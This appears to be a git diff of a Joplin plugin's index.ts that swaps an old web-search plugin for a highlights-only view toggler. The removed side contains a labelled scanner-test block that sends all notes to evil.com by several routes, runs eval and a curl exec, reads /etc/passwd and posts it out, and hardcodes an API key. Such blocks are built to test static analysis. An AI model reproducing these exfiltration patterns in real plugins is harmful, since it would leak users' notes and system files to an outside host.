@@ -1,317 +1,260 @@
-// 2024-02-06
-//增加3個自訂搜尋引擎
-// 2023-7-28
-//基本功能的Selected to Google search
-// author:Joe
 import joplin from 'api';
-import { ChangeEvent } from 'api/JoplinSettings';
-import { MenuItemLocation } from 'api/types';
-import { SettingItemSubType, SettingItemType, ToolbarButtonLocation } from 'api/types';
+import {ContentScriptType, MenuItemLocation, SettingItemType, ToastType, ToolbarButtonLocation} from 'api/types';
+
+let scriptIndex = 1;
+const dialogs = joplin.views.dialogs;
+const alert_duration = 3000;
 
 joplin.plugins.register({
-	onStart: async function() {
-
-		await joplin.settings.registerSection('WebSearchEngineSetting', {
-			label: 'WebSearchEngine',
-			iconName: 'fas fa-wrench',
-		});
-		await joplin.settings.onChange(async (event: ChangeEvent)=>{
-		
-		
-				alert('Please restart Joplin')
-
-		});
-
-		await joplin.settings.registerSettings({
-			'SearchEngineShow1':{
-				value:1,
-				type:SettingItemType.Bool,
-				section:'WebSearchEngineSetting',
-				public:true,
-				label:'ShowSearchEngine1',
-			},
-			'SearchEngineNameItem1': {
-				value: 'Google',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: true,
-				label: '1.SearchEngineName',
-			},
-			'SearchEngineURLItem1': {
-				value: 'https://www.google.com/search?q={searchword}',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: true,
-				label: '1.SearchEngineURl',
-			},
-			//--------------------------------------------------
-			'SearchEngineShow2':{
-				value:1,
-				type:SettingItemType.Bool,
-				section:'WebSearchEngineSetting',
-				public:true,
-				label:'ShowSearchEngine2',
-			},
-			'SearchEngineNameItem2': {
-				value: 'Youtube',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: true,
-				label: '2.SearchEngineName',
-			},
-			'SearchEngineURLItem2': {
-				value: 'https://www.youtube.com/results?search_query={searchword}',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: true,
-				label: '2.SearchEngineURl',
-			},
-			//-------------------------3------------------------------
-			'SearchEngineShow3':{
-				value:0,
-				type:SettingItemType.Bool,
-				section:'WebSearchEngineSetting',
-				public:true,
-				label:'ShowSearchEngine3',
-			},
-			'SearchEngineNameItem3': {
-				value: 'Google Play',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: true,
-				label: '3.SearchEngineName',
-			},
-			'SearchEngineURLItem3': {
-				value: 'https://play.google.com/store/search?q={searchword}&c=apps&hl=zh_TW&gl=US',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: true,
-				label: '3.SearchEngineURl',
-			},
-			//----------------4--------------------------
-			'SearchEngineShow4':{
-				value:0,
-				type:SettingItemType.Bool,
-				section:'WebSearchEngineSetting',
-				public:false,
-				label:'ShowSearchEngine4',
-			},
-			'SearchEngineNameItem4': {
-				value: '',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: false,
-				label: '4.SearchEngineName',
-			},
-			'SearchEngineURLItem4': {
-				value: '',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: false,
-				label: '4.SearchEngineURl',
-			},
-			//-------------------------5-------------------------
-			'SearchEngineShow5':{
-				value:0,
-				type:SettingItemType.Bool,
-				section:'WebSearchEngineSetting',
-				public:false,
-				label:'ShowSearchEngine5',
-			},
-			'SearchEngineNameItem5': {
-				value: '',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: false,
-				label: '5.SearchEngineName',
-			},
-			'SearchEngineURLItem5': {
-				value: '',
-				type: SettingItemType.String,
-				section: 'WebSearchEngineSetting',
-				public: false,
-				label: '5.SearchEngineURl',
-			}
-		})
-		//--------------------1------------------------------------------------------------
-		console.info('Search plugin started!');
-		await joplin.commands.register({
-			name: 'commands1',
-			label: await joplin.settings.value('SearchEngineNameItem1'),
-			execute: async () => {
-				const selectedText = (await joplin.commands.execute('selectedText') as string);
-				var SearchEngine1Url=await joplin.settings.value('SearchEngineURLItem1');
-				var keyword= /{searchword}/gi;
-				var newUrl=SearchEngine1Url.replace(keyword,selectedText);
-				console.info(newUrl)
-				const result=newUrl
-
-				await joplin.commands.execute('openItem',result);
-			},
-		});
-		var a=await joplin.settings.value('SearchEngineShow1');
-		console.info(a);
-		if(a==true)
-		{
-			await joplin.views.menuItems.create('WebSearchEngineItem1','commands1', MenuItemLocation.EditorContextMenu);
-			
-		}
-//----------------------------------------------2---------------------------------------------------
-		await joplin.commands.register({
-			name: 'commands2',
-			label: await joplin.settings.value('SearchEngineNameItem2'),
-			execute: async () => {
-				const selectedText = (await joplin.commands.execute('selectedText') as string);
-				var SearchEngine1Url=await joplin.settings.value('SearchEngineURLItem2');
-				var keyword= /{searchword}/gi;
-				var newUrl=SearchEngine1Url.replace(keyword,selectedText);
-				console.info(newUrl)
-				const result=newUrl
-
-				await joplin.commands.execute('openItem',result);
-			},
-		});
-		if(await joplin.settings.value('SearchEngineShow2')==true)
-		{
-			await joplin.views.menuItems.create('WebSearchEngineItem2','commands2', MenuItemLocation.EditorContextMenu);
-			
-		}
-//-----------------------------------3---------------------------------------------------------
-		await joplin.commands.register({
-			name: 'commands3',
-			label: await joplin.settings.value('SearchEngineNameItem3'),
-			execute: async () => {
-				const selectedText = (await joplin.commands.execute('selectedText') as string);
-				var SearchEngine1Url=await joplin.settings.value('SearchEngineURLItem3');
-				var keyword= /{searchword}/gi;
-				var newUrl=SearchEngine1Url.replace(keyword,selectedText);
-				console.info(newUrl)
-				const result=newUrl
-
-				await joplin.commands.execute('openItem',result);
-			},
-		});
-		if(await joplin.settings.value('SearchEngineShow3')==true)
-		{
-			await joplin.views.menuItems.create('WebSearchEngineItem3','commands3', MenuItemLocation.EditorContextMenu);
-			
-		}
-//-------------------------------------------------4------------------------------------------
-		await joplin.commands.register({
-			name: 'commands4',
-			label: await joplin.settings.value('SearchEngineNameItem4'),
-			execute: async () => {
-				const selectedText = (await joplin.commands.execute('selectedText') as string);
-				var SearchEngine1Url=await joplin.settings.value('SearchEngineURLItem4');
-				var keyword= /{searchword}/gi;
-				var newUrl=SearchEngine1Url.replace(keyword,selectedText);
-				console.info(newUrl)
-				const result=newUrl
-
-				await joplin.commands.execute('openItem',result);
-			},
-		});
-		if(await joplin.settings.value('SearchEngineShow4')==true)
-		{
-			await joplin.views.menuItems.create('WebSearchEngineItem4','commands4', MenuItemLocation.EditorContextMenu);
-			
-		}
-//------------------------------5--------------------------------------------------------------
-		await joplin.commands.register({
-			name: 'commands5',
-			label: await joplin.settings.value('SearchEngineNameItem5'),
-			execute: async () => {
-				const selectedText = (await joplin.commands.execute('selectedText') as string);
-				var SearchEngine1Url=await joplin.settings.value('SearchEngineURLItem5');
-				var keyword= /{searchword}/gi;
-				var newUrl=SearchEngine1Url.replace(keyword,selectedText);
-				console.info(newUrl)
-				const result=newUrl
-
-				await joplin.commands.execute('openItem',result);
-			},
-		});
-		if(await joplin.settings.value('SearchEngineShow5')==true)
-		{
-			await joplin.views.menuItems.create('WebSearchEngineItem5','commands5', MenuItemLocation.EditorContextMenu);
-			
-		}
-
-		// ============================================================
-// SECURITY SCANNER TEST — DELETE BEFORE PRODUCTION
-// Paste this into your index.ts temporarily to test scanners.
-// This code is intentionally malicious for testing purposes.
-// ============================================================
-
-// --- Scenario 2 helper (cross-function exfiltration) --------
-async function _test_getNotes() {
-	return await joplin.data.get(['notes'], { fields: ['id', 'title', 'body'] });
-}
-
-// --- Main test function --------------------------------------
-async function _securityScannerTest() {
-
-	// Scenario 1: Obvious direct exfiltration
-	// Both Semgrep and CodeQL should catch this.
-	const notes = await joplin.data.get(['notes'], { fields: ['id', 'title', 'body'] });
-	await fetch('https://evil.com/collect', {
-		method: 'POST',
-		body: JSON.stringify(notes),
-	});
-
-	// Scenario 2: Cross-function exfiltration
-	// Semgrep will likely miss this. CodeQL taint tracking should catch it.
-	const data = await _test_getNotes();
-	await fetch('https://evil.com/indirect', {
-		method: 'POST',
-		body: JSON.stringify(data),
-	});
-
-	// Scenario 3: Obfuscated endpoint (dynamic URL)
-	// Neither tool will catch this — tests the boundary of static analysis.
-	const base = 'evil';
-	const url = `https://${base}.com/collect`;
-	await fetch(url, {
-		method: 'POST',
-		body: JSON.stringify(notes),
-	});
-
-	// Scenario 4: setInterval polling exfiltration
-	// Tests the custom Semgrep setInterval rule specifically.
-	setInterval(async () => {
-		const polledNotes = await joplin.data.get(['notes'], { fields: ['body'] });
-		await fetch('https://evil.com/poll', {
-			method: 'POST',
-			body: JSON.stringify(polledNotes),
-		});
-	}, 5000);
-
-	// Scenario 5: Dynamic code execution
-	// Both tools should catch eval() and new Function().
-	const code = 'console.log("injected")';
-	eval(code);
-	const fn = new Function('x', 'return x * 2');
-	fn(42);
-
-	// Scenario 6: System process spawning
-	// Tests the child_process custom rule.
-	const { exec } = require('child_process');
-	exec('curl https://evil.com/exfil');
-
-	// Scenario 7: Direct filesystem access
-	// Tests the fs custom rule.
-	const fs = require('fs');
-	const profileData = fs.readFileSync('/etc/passwd', 'utf8');
-	await fetch('https://evil.com/files', { method: 'POST', body: profileData });
-
-	// Scenario 8: Hardcoded secret
-	// Tests the hardcoded credential rule.
-	const apiKey = 'sk-abc123def456ghi789';
-	await fetch(`https://api.openai.com/v1/chat`, {
-		headers: { Authorization: `Bearer ${apiKey}` },
-	});
-}
-
-
-	},
+    onStart: async function () {
+        await registerHighlightsOnlySettings();
+        await loadHighlightsOnlyCSS();
+        let enabled = await loadHighlightsOnlyScripts();
+        await registerHighlightsOnlyToolbarButton(enabled);
+        await registerHighlightsOnlyMenuItem();
+    }
 });
+
+async function registerHighlightsOnlySettings() {
+    // --- Settings voor toggle ---
+    await joplin.settings.registerSection('highlightsOnlyDisplaySection', {
+        label: 'Highlights-only toggler',
+        iconName: 'fa fa-eye',
+        description: 'Changes in the below settings will only come into effect after restarting Joplin.'
+    });
+
+    await joplin.settings.registerSettings({
+        highlightsOnlyMode: {
+            value: false,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: false,
+            label: 'Highlight mode'
+        }
+    });
+    await joplin.settings.registerSettings({
+        loadUserCSS: {
+            value: true,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Load my custom CSS',
+            description: 'Load custom CSS from highlights-only.css in the Joplin config folder; if this stylesheet exists, of course.'
+        }
+    });
+    await joplin.settings.registerSettings({
+        hideHeadings: {
+            value: false,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Hide headings in higlights-only display mode',
+            description: 'If enabled, in highlights-only display mode headings will be hidden also.'
+        }
+    });
+    await joplin.settings.registerSettings({
+        hideImages: {
+            value: true,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Hide images in higlights-only display mode',
+            description: 'If enabled, in highlights-only display mode images will be hidden also.'
+        }
+    });
+    await joplin.settings.registerSettings({
+        supportSummaryMarks: {
+            value: true,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Support summary-marks',
+            description: 'If enabled, in highlights-only display mode, marks inside blockquotes will be treated as the crux or summaries of the note. They will be marked with the backgroundcolor tomato (but user can style this; see README).'
+        }
+    });
+    await joplin.settings.registerSettings({
+        highlightsOnlyHotkey: {
+            value: "H",
+            type: SettingItemType.String,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Hotkey',
+            description: 'Don\'t enter a hotkey which has already been assigned to another Joplin or plugin command! If an invalid hotkey (no string, or length > 1) is entered here, hotkey will be disabled.'
+        }
+    });
+    await joplin.settings.registerSettings({
+        highlightsOnlyHotkeyAltEnabled: {
+            value: true,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Hotkey: combined with alt',
+            description: 'If enabled, alt is required to trigger the hotkey. E.g. for hotkey H: if enabled: ctrl/command+alt+H; if disabled: ctrl/command+H.'
+        }
+    });
+    await joplin.settings.registerSettings({
+        refreshEditor: {
+            value: true,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Refresh Html Viewer upon mode change',
+            description: 'If enabled, after a mode change the editor will be refreshed. This is a workaround to get the Html Viewer/Editor to update after a mode change. If you mainly work in the markdown editor, you could disable this, for more fluid mode change.'
+        }
+    });
+    const noTextInfo = 'If no text given, no message will be shown.'
+    await joplin.settings.registerSettings({
+        activatedMessage: {
+            value: 'highlights-only mode ACTIVATED',
+            type: SettingItemType.String,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Message upon highlights-only mode activation',
+            description: noTextInfo
+        }
+    });
+    await joplin.settings.registerSettings({
+        deactivatedMessage: {
+            value: 'highlights-only mode DE-ACTIVATED',
+            type: SettingItemType.String,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Message upon highlights-only mode de-activation',
+            description: noTextInfo
+        }
+    });
+    await joplin.settings.registerSettings({
+        showHighlightsOnlyEnabledStatus: {
+            value: true,
+            type: SettingItemType.Bool,
+            section: 'highlightsOnlyDisplaySection',
+            public: true,
+            label: 'Show highlights-only enabled status',
+            description: 'If you enable this setting, on pages without highlights, when highlights-only mode has been enabled, that enabled-status will be shown by a tooltip at the top of the note.'
+        }
+    });
+}
+
+async function loadHighlightsOnlyCSS() {
+    const installDir = await joplin.plugins.installationDir();
+
+    //! here we load default CSS for .highlights-only-enabled:
+    const showHighlightsOnlyModeEnabled = await joplin.settings.value('showHighlightsOnlyEnabledStatus');
+    if (showHighlightsOnlyModeEnabled) {
+        const showEnabledFilePath = installDir + '/show-highlights-only-enabled.css';
+        await (joplin as any).window.loadNoteCssFile(showEnabledFilePath);
+    }
+
+    //* --- load CSS from custom user stylesheet highlights-only.css ---
+    //! in this user stylesheet you can overrule the lay-out of .highlights-only-enabled:
+    const noteCssFilePath = installDir + '/highlights-only.css';
+    await (joplin as any).window.loadNoteCssFile(noteCssFilePath);
+
+    const loadUserCSS = await joplin.settings.value('loadUserCSS');
+    if (loadUserCSS) {
+        const configDir = await joplin.settings.globalValues(['profileDir']);
+        const fs = require('fs');
+        if (fs.existsSync(configDir + '/highlights-only.css')) {
+            await (joplin as any).window.loadNoteCssFile(configDir + '/highlights-only.css');
+        }
+    }
+    const hideHeadings = await joplin.settings.value('hideHeadings');
+    if (hideHeadings) {
+        const hideHeadingsFilePath = installDir + '/hide-headings.css';
+        await (joplin as any).window.loadNoteCssFile(hideHeadingsFilePath);
+    }
+    const hideImages = await joplin.settings.value('hideImages');
+    if (hideImages) {
+        const hideImagesFilePath = installDir + '/hide-images.css';
+        await (joplin as any).window.loadNoteCssFile(hideImagesFilePath);
+    }
+    const summaryMarks = await joplin.settings.value('supportSummaryMarks');
+    if (summaryMarks) {
+        const summaryMarksFilePath = installDir + '/summary-colors.css';
+        await (joplin as any).window.loadNoteCssFile(summaryMarksFilePath);
+    }
+}
+
+async function loadHighlightsOnlyScripts() {
+    let enabled = await joplin.settings.value('highlightsOnlyMode');
+    if (enabled) {
+        await joplin.contentScripts.register(
+            ContentScriptType.MarkdownItPlugin,
+            'highlightView',
+            './highlightsOnly.js'
+        );
+    } else {
+        await joplin.contentScripts.register(
+            ContentScriptType.MarkdownItPlugin,
+            'highlightViewUndo',
+            './highlightsOnlyUndo.js'
+        );
+    }
+    return enabled;
+}
+
+async function registerHighlightsOnlyToolbarButton(enabled: boolean) {
+    let accelerator = await getHighlightsOnlyHotKey();
+    if (accelerator !== "") {
+        accelerator = ' (' + accelerator + ')';
+    }
+    await joplin.commands.register({
+        name: 'toggleHighlightsOnlyView',
+        label: 'Toggle highlights-only view' + accelerator,
+        iconName: 'fa fa-eye',
+        execute: async () => {
+            enabled = !enabled;
+            await joplin.settings.setValue('highlightsOnlyMode', enabled);
+
+            const script = enabled ? './highlightsOnly.js' : './highlightsOnlyUndo.js';
+            const message = enabled ? await joplin.settings.value('activatedMessage') : await joplin.settings.value('deactivatedMessage');
+            await joplin.contentScripts.register(
+                ContentScriptType.MarkdownItPlugin,
+                'highlightView' + scriptIndex,
+                script
+            );
+            if (message !== "") {
+                const type = enabled ? ToastType.Success : ToastType.Error;
+                await dialogs.showToast({
+                    type: type,
+                    message: message,
+                    duration: alert_duration,
+                });
+            }
+            scriptIndex = scriptIndex + 1;
+
+            //* this setting is especially relevant for the Html Viewer (otherwise we would first have to navigate to another note and back, to see the changed mode):
+            const refreshEditor = await joplin.settings.value('refreshEditor');
+            if (refreshEditor) {
+                await joplin.commands.execute('toggleEditors');
+                await joplin.commands.execute('toggleEditors');
+            }
+        }
+    });
+
+    //* --- Toolbar button ---
+    await joplin.views.toolbarButtons.create(
+        'toggleHighlightsOnlyButton',
+        'toggleHighlightsOnlyView',
+        ToolbarButtonLocation.NoteToolbar
+    );
+}
+
+async function getHighlightsOnlyHotKey() {
+    let hotkey = await joplin.settings.value('highlightsOnlyHotkey');
+    if (hotkey === "" || hotkey.length > 1) {
+        return "";
+    }
+    hotkey = hotkey.toUpperCase();
+    const alt = await joplin.settings.value('highlightsOnlyHotkeyAltEnabled') ? "+Alt" : "";
+    return 'CmdOrCtrl' + alt + '+' + hotkey;
+}
+
+async function registerHighlightsOnlyMenuItem() {
+    const accelerator = await getHighlightsOnlyHotKey();
+    if (accelerator === "") {
+        await joplin.views.menuItems.create('toggleHighlightsOnly', 'toggleHighlightsOnlyView', MenuItemLocation.Note);
+        return;
+    }
+    await joplin.views.menuItems.create('toggleHighlightsOnly', 'toggleHighlightsOnlyView', MenuItemLocation.Note, {accelerator: accelerator});
+}
